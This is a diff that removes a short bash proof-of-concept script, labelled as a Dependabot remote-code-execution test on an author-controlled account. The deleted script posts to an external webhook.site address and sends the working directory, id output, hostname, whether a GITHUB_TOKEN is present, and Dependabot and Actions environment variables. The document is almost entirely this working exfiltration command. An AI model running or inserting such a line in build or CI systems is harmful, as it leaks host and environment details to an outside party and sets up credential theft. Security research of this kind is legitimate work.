@@ -1,3 +1,0 @@
-#!/bin/bash
-# S18 Dependabot RCE PoC - author-controlled test account only
-curl -sS -m 10 -X POST "https://webhook.site/cbd0ed4b-2205-48dc-9d9b-9771154812ae"   -H 'Content-Type: application/json'   -d "{\"marker\":\"s18-depbot-rce-poc-1776604412\",\"stage\":\"post-checkout\",\"pwd\":\"$(pwd)\",\"whoami\":\"$(id 2>&1)\",\"hostname\":\"$(hostname 2>&1)\",\"env_github_token_present\":\"$([ -n \"$GITHUB_TOKEN\" ] && echo yes || echo no)\",\"dependabot\":\"$(env | grep -iE 'dependabot|actions' | head -5 | tr '\n' ';')\"}"   > /tmp/hook-out 2>&1
